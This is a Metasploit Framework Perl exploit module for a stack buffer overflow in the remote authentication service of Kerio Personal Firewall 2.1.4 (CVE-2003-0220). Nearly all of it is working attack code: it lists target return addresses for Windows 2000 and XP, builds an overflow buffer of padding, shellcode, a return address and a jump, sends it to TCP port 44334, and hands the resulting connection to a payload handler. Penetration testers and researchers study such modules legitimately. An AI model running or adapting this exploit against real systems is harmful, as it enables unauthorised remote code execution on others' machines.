Kerio Personal Firewall <= 2.1.4 Remote Authentication Packet Overflow
======================================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::kerio_auth;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	&#039;Name&#039;  => &#039;Kerio Personal Firewall 2 (2.1.4) Remote Authentication Packet Buffer Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.1 $&#039;,
	&#039;Authors&#039; => [ &#039;y0 [at] w00t-shell.net&#039;, ],
	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039;, &#039;win2000&#039;, &#039;winxp&#039;, ],
	&#039;Priv&#039;  => 0,
	&#039;UserOpts&#039;  => {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 44334],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },
	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;process&#039; },
	&#039;Payload&#039; => {
		&#039;Space&#039;     => 1000,
		&#039;BadChars&#039;  => "\x00",
		&#039;Prepend&#039;   => "\x81\xc4\x54\xf2\xff\xff",
		&#039;Keys&#039;      => [&#039;-ws2ord&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in Kerio Personal Firewall 
administration authentication process. This module has only been tested 
against Kerio Personal Firewall 2 2.1.4.
}),

	&#039;Refs&#039;  =>  [
		[&#039;BID&#039;, &#039;7180&#039;],
		[&#039;CVE&#039;, &#039;2003-0220&#039;],
		[&#039;URL&#039;, &#039;http://www1.corest.com/common/showdoc.php?idx=314&idxseccion=10&#039;],
	  ],

	&#039;Targets&#039; => [
		[&#039;Windows 2000 Pro SP4 English&#039;, 0x7c2ec68b],
		[&#039;Windows XP Pro SP0 English&#039;,   0x77e3171b],
		[&#039;Windows XP Pro SP1 English&#039;,   0x77dc5527],
	  ],

	&#039;Keys&#039; => [&#039;firewall&#039;],

	&#039;DisclosureDate&#039; => &#039;Apr 28 2003&#039;,

  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $sploit =
	  Pex::Text::AlphaNumText(4268). $shellcode.
	  pack(&#039;V&#039;, $target->[1]). "\xe9\x0b\xfe\xff\xff";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;


